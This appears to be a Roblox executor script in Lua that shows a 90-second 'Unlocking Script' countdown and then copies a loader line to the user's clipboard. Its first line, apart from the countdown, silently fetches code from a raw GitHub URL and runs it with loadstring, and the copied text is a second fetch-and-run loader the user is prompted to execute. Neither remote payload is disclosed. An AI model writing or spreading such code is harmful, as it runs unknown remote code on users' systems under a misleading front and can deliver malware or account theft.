loadstring(game:HttpGet("https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/No"))()
wait(2)
--!strict
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")

-- Configuration
local COUNTDOWN_DURATION = 90 -- seconds
local SCRIPT_TO_COPY = [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/GagVeryGood"))()
]]

-- Local variables
local player = Players.LocalPlayer
local startTime = 0
local activeConnection = nil
local lastShownSecond = nil

-- Function to show a notification
local function showNotification(title: string, text: string, duration: number?)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = duration or 1
		})
	end)
end

-- Countdown update logic (called every frame but throttled)
local function updateCountdown()
	local elapsed = os.time() - startTime
	local remaining = COUNTDOWN_DURATION - elapsed

	if remaining <= 0 then
		if activeConnection then
			activeConnection:Disconnect()
			activeConnection = nil
		end

		-- Final notification and copy script
		pcall(function()
			setclipboard(SCRIPT_TO_COPY)
		end)

		showNotification("Script Unlocked!", "Script copied to clipboard!", 5)
		return
	end

	local secondsRemaining = os.time() -- 🔧 Fixed here
	if secondsRemaining ~= lastShownSecond then
		lastShownSecond = secondsRemaining
		local minutes = math.floor(remaining / 60)
		local seconds = remaining % 60
		showNotification("⚠️Unlocking Script", string.format("Please wait...\nTime remaining: %d:%02d", minutes, seconds), 1)
	end
end

-- Initial startup
showNotification("Initializing", "Unlocking your script... please wait", 2)

-- Start countdown after delay
task.delay(2, function()
	startTime = os.time()
	showNotification("⚠️Unlocking Script", "Starting countdown...", 1)

	activeConnection = RunService.Heartbeat:Connect(function()
		updateCountdown()
	end)
end)
